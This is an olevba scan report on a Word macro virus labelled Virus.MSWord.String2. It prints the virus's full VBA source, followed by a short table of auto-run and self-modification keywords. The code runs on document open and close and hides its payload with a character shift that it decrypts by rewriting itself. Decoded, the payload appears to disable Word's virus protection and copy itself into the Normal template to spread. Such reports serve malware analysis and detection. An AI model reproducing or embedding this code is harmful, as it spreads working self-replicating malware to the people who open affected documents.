olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.String2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.String2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open(): On Error Resume Next
If Left(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(28, 1), 1) = "'" Then
For e = 28 To 44
rajt = Right(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(e, 1), (Len(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(e, 1)) - 1))
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline e, rajt
Next
For we = 28 To 44
naskod = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(we, 1)
For df = 1 To Len(naskod)
novi = novi & Chr(Asc(Mid(naskod, df)) - 7)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline we, novi
novi = ""
Next
string_boy
Else
For we = 28 To 44
naskod = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(we, 1)
For df = 1 To Len(naskod)
novi = novi & Chr(Asc(Mid(naskod, df)) + 7)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline we, Chr(39) & novi
novi = ""
Next
End If
End Sub
Private Sub string_boy()
'Jvuz{'u|sh'D'7
'Kpt'h3'i3'j3'kA'Zl{'i'D'[opzKvj|tlu{A'Vw{pvuz5]py|zWyv{lj{pvu'D'u|sh
'Pm'i'D'Hj{p}lKvj|tlu{'[olu'Zl{'j'D'Uvyths[ltwsh{l'Lszl'Zl{'j'D'Hj{p}lKvj|tlu{
'k'D'i5]IWyvqlj{5}ijvtwvulu{z/805jvkltvk|sl5spulz/83'f
'i5]IWyvqlj{5}ijvtwvulu{z/805jvkltvk|sl5jv|u{vmspulz0A'h'D'Z{ypunz5SJhzl/k0
'^p{o'j5]IWyvqlj{5}ijvtwvulu{z/805jvkltvk|sl
'n'D'5spulz/:=3'80
'Pm'n'CE').z{ypunfiv€)'[olu
'^p{o'j5]IWyvqlj{5}ijvtwvulu{z/805jvkltvk|sl
'5klsl{lspulz'83'j5]IWyvqlj{5}ijvtwvulu{z/805jvkltvk|sl5jv|u{vmspulz
'5puzly{spulz'83'h
'Luk'^p{o
'Luk'Pm
'Luk'^p{o
'Pm'Kh€/Uv~/00'D'>'[olu
'TznIv')p.ht'hsp}l()3'}iJyp{pjhs3')z{ypunfiv€)
'Luk'Pm
End Sub
'string_boy
'10x to jackie for help on encryption
'greetz to all ppl on #virus and #vxtrader
'SP. greetz to BiHNet.ORG and -=PU=-
Private Sub Document_Close()
document_open
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

